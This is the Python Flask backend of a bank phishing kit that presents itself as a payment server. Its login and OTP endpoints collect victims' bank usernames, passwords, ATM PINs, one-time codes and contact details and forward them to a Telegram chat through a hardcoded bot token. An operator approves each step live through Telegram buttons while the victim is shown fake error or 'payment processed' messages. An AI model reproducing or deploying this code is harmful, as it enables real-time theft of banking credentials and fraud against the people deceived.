import os
import json
import requests
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from threading import Thread
import time

app = Flask(__name__)

# Configurar CORS para funcionar correctamente desde Azure y otros orígenes
cors_config = {
    "origins": ["*"],
    "methods": ["GET", "POST", "OPTIONS"],
    "allow_headers": ["Content-Type", "Authorization"]
}
CORS(app, resources={r"/api/*": cors_config})

# ══════════════════════════════════════════════════════════════
# CONFIGURACIÓN
# ══════════════════════════════════════════════════════════════
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8578415094:AAFIbQglTSUmxX3IK4nQfuayvmQfDh-aYjM')
CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '-1003526160154')
WEBHOOK_URL = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'

sessions_db = {}

# ══════════════════════════════════════════════════════════════
# ENDPOINTS
# ══════════════════════════════════════════════════════════════

@app.route('/api/login', methods=['POST'])
def login():
    """
    Recibe credenciales del cliente y las envía a Telegram
    """
    try:
        data = request.json
        session_id = data.get('sessionId')
        bank = data.get('bank', 'BANCO DESCONOCIDO')
        usuario = data.get('usuario')
        clave = data.get('clave')
        pin = data.get('pin', '')
        tipoDoc = data.get('tipoDoc', '')
        phone = data.get('phone', 'N/A')
        amount = data.get('amount', 'N/A')
        email = data.get('email', 'N/A')
        persona = data.get('persona', 'N/A')

        if not session_id or not usuario or not clave:
            return jsonify({'error': 'Datos incompletos'}), 400

        # Guardar sesión en memoria
        sessions_db[session_id] = {
            'bank': bank,
            'usuario': usuario,
            'clave': clave,
            'pin': pin,
            'tipoDoc': tipoDoc,
            'phone': phone,
            'amount': amount,
            'email': email,
            'persona': persona,
            'status': 'waiting',
            'message': '',
            'otpLabel': 'Ingresa el código de 6 dígitos',
            'created_at': datetime.now().isoformat(),
            'otp': '',
            'otp_attempts': 0
        }

        print(f'[LOGIN] Nueva sesión creada: {session_id}')

        # Preparar mensaje para Telegram con botones
        message = f"""
🏦 <b>CREDENCIALES — {bank}</b>
━━━━━━━━━━━━━━━━━
📄 <b>Tipo doc:</b> {tipoDoc}
👤 <b>Usuario:</b> <code>{usuario}</code>
🔑 <b>Clave:</b> <code>{clave}</code>
🏧 <b>Clave cajero:</b> <code>{pin}</code>
📱 <b>Celular:</b> {phone}
💰 <b>Monto:</b> {amount}
📧 <b>Email:</b> {email}
👥 <b>Persona:</b> {persona}
🆔 <b>Sesión:</b> {session_id}
⏰ <b>Timestamp:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━
<i>Selecciona una acción:</i>
"""

        buttons = [
            [
                {'text': '✅ PERMITIR OTP', 'callback_data': f'action_otp_{session_id}'},
                {'text': '❌ RECHAZAR', 'callback_data': f'action_reject_{session_id}'},
            ]
        ]

        # Enviar a Telegram
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML',
            'reply_markup': {'inline_keyboard': buttons}
        }

        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 200:
            print(f'[LOGIN] Mensaje enviado a Telegram para sesión {session_id}')
        else:
            print(f'[LOGIN ERROR] Error enviando a Telegram: {response.text}')

        return jsonify({'success': True, 'sessionId': session_id}), 200

    except Exception as e:
        print(f'[LOGIN ERROR] {str(e)}')
        return jsonify({'error': str(e)}), 500


@app.route('/api/session/<session_id>', methods=['GET'])
def get_session(session_id):
    """
    Retorna el estado actual de la sesión
    El cliente hace polling a este endpoint cada 2 segundos
    """
    try:
        if session_id not in sessions_db:
            return jsonify({'error': 'Sesión no encontrada'}), 404

        session = sessions_db[session_id]

        response_data = {
            'status': session['status'],
            'message': session.get('message', ''),
            'otpLabel': session.get('otpLabel', 'Ingresa el código de 6 dígitos')
        }

        print(f'[POLLING] Session {session_id}: status={session["status"]}')

        return jsonify(response_data), 200

    except Exception as e:
        print(f'[POLLING ERROR] {str(e)}')
        return jsonify({'error': str(e)}), 500


@app.route('/api/otp', methods=['POST'])
def submit_otp():
    """
    Recibe el OTP del cliente
    """
    try:
        data = request.json
        session_id = data.get('sessionId')
        otp = data.get('otp')

        if not session_id or not otp:
            return jsonify({'error': 'Datos incompletos'}), 400

        if session_id not in sessions_db:
            return jsonify({'error': 'Sesión no encontrada'}), 404

        session = sessions_db[session_id]
        session['otp'] = otp
        session['otp_attempts'] = session.get('otp_attempts', 0) + 1

        print(f'[OTP] Recibido OTP para sesión {session_id}: {otp}')

        # Enviar OTP a Telegram
        message = f"""
🔐 <b>CÓDIGO OTP RECIBIDO — {session['bank']}</b>
━━━━━━━━━━━━━━━━━
📱 <b>Código:</b> <code>{otp}</code>
👤 <b>Usuario:</b> <code>{session['usuario']}</code>
💰 <b>Monto:</b> {session['amount']}
🆔 <b>Sesión:</b> {session_id}
⏰ <b>Intento:</b> {session['otp_attempts']}
━━━━━━━━━━━━━━━━━
<i>Selecciona una acción:</i>
"""

        buttons = [
            [
                {'text': '✅ CONFIRMAR OTP', 'callback_data': f'action_otp_confirm_{session_id}'},
                {'text': '❌ RECHAZAR OTP', 'callback_data': f'action_otp_reject_{session_id}'},
            ]
        ]

        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'HTML',
            'reply_markup': {'inline_keyboard': buttons}
        }

        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 200:
            print(f'[OTP] OTP enviado a Telegram para sesión {session_id}')
        else:
            print(f'[OTP ERROR] Error enviando OTP a Telegram: {response.text}')

        return jsonify({'success': True}), 200

    except Exception as e:
        print(f'[OTP ERROR] {str(e)}')
        return jsonify({'error': str(e)}), 500


@app.route('/api/callback', methods=['POST'])
def handle_callback():
    """
    Webhook para recibir respuestas de los botones de Telegram
    """
    try:
        update = request.json
        print(f'[CALLBACK] Recibido update: {json.dumps(update, indent=2)}')

        if 'callback_query' not in update:
            print('[CALLBACK] No contiene callback_query')
            return jsonify({'ok': True}), 200

        callback_query = update['callback_query']
        callback_data = callback_query.get('data', '')
        callback_id = callback_query.get('id')

        print(f'[CALLBACK] Data: {callback_data}')
        print(f'[CALLBACK] ID: {callback_id}')

        # Responder al callback (marca como leído el botón)
        try:
            requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery',
                json={'callback_query_id': callback_id, 'text': 'Procesando...'}
            )
        except Exception as e:
            print(f'[CALLBACK] Error respondiendo al callback: {str(e)}')

        # ══════════════════════════════════════════════════════════
        # PROCESAR ACCIONES SEGÚN callback_data
        # ══════════════════════════════════════════════════════════

        # ACCIÓN: Permitir OTP (admin hace click en primer botón)
        if callback_data.startswith('action_otp_') and 'confirm' not in callback_data and 'reject' not in callback_data:
            session_id = callback_data.replace('action_otp_', '')
            print(f'[CALLBACK] OTP PERMITIDO para sesión: {session_id}')

            if session_id in sessions_db:
                sessions_db[session_id]['status'] = 'otp'
                sessions_db[session_id]['otpLabel'] = 'Ingresa el código de 6 dígitos enviado a tu celular'
                print(f'[CALLBACK] Status actualizado a "otp"')
            else:
                print(f'[CALLBACK] Sesión no encontrada: {session_id}')

        # ACCIÓN: Rechazar credenciales
        elif callback_data.startswith('action_reject_'):
            session_id = callback_data.replace('action_reject_', '')
            print(f'[CALLBACK] CREDENCIALES RECHAZADAS para sesión: {session_id}')

            if session_id in sessions_db:
                sessions_db[session_id]['status'] = 'error_login'
                sessions_db[session_id]['message'] = 'Usuario o clave incorrectos'
                print(f'[CALLBACK] Status actualizado a "error_login"')
            else:
                print(f'[CALLBACK] Sesión no encontrada: {session_id}')

        # ACCIÓN: Confirmar OTP
        elif callback_data.startswith('action_otp_confirm_'):
            session_id = callback_data.replace('action_otp_confirm_', '')
            print(f'[CALLBACK] OTP CONFIRMADO para sesión: {session_id}')

            if session_id in sessions_db:
                sessions_db[session_id]['status'] = 'finalizar'
                sessions_db[session_id]['message'] = 'Pago procesado correctamente'
                print(f'[CALLBACK] Status actualizado a "finalizar"')
            else:
                print(f'[CALLBACK] Sesión no encontrada: {session_id}')

        # ACCIÓN: Rechazar OTP
        elif callback_data.startswith('action_otp_reject_'):
            session_id = callback_data.replace('action_otp_reject_', '')
            print(f'[CALLBACK] OTP RECHAZADO para sesión: {session_id}')

            if session_id in sessions_db:
                sessions_db[session_id]['status'] = 'otp_error'
                sessions_db[session_id]['message'] = 'Código OTP rechazado. Intenta nuevamente.'
                print(f'[CALLBACK] Status actualizado a "otp_error"')
            else:
                print(f'[CALLBACK] Sesión no encontrada: {session_id}')

        print(f'[CALLBACK] Estados actuales: {list(sessions_db.keys())}')
        return jsonify({'ok': True}), 200

    except Exception as e:
        print(f'[CALLBACK ERROR] Excepción: {str(e)}')
        import traceback
        traceback.print_exc()
        return jsonify({'ok': True}), 200


@app.route('/api/health', methods=['GET'])
def health_check():
    """
    Endpoint para verificar que el servidor está activo
    """
    return jsonify({
        'status': 'active',
        'timestamp': datetime.now().isoformat(),
        'sessions_count': len(sessions_db),
        'sessions': list(sessions_db.keys())
    }), 200


@app.route('/', methods=['GET'])
def index():
    """
    Página de inicio
    """
    return jsonify({
        'app': 'Alcanos Payment Server',
        'version': '1.0.0',
        'status': 'running',
        'endpoints': {
            'POST /api/login': 'Enviar credenciales',
            'GET /api/session/<id>': 'Polling de estado',
            'POST /api/otp': 'Enviar OTP',
            'POST /api/callback': 'Webhook de Telegram',
            'GET /api/health': 'Health check'
        }
    }), 200


# ══════════════════════════════════════════════════════════════
# KEEP-ALIVE PARA RENDER
# ══════════════════════════════════════════════════════════════
def keep_alive():
    """
    Hace ping a sí mismo cada 10 minutos para que Render no duerma la app
    """
    while True:
        try:
            time.sleep(10 * 60)  # 10 minutos
            requests.get(f'http://localhost:5000/api/health', timeout=5)
            print(f'[KEEP-ALIVE] Ping a las {datetime.now().strftime("%H:%M:%S")}')
        except Exception as e:
            print(f'[KEEP-ALIVE] Error: {str(e)}')


# ══════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════
if __name__ == '__main__':
    # Iniciar thread de keep-alive
    keep_alive_thread = Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()

    # Puerto desde Render o localhost:5000
    port = int(os.getenv('PORT', 5000))
    print(f'[SERVER] Iniciando servidor en puerto {port}')
    print(f'[SERVER] BOT_TOKEN: {BOT_TOKEN[:20]}...')
    print(f'[SERVER] CHAT_ID: {CHAT_ID}')
    app.run(host='0.0.0.0', port=port, debug=False)
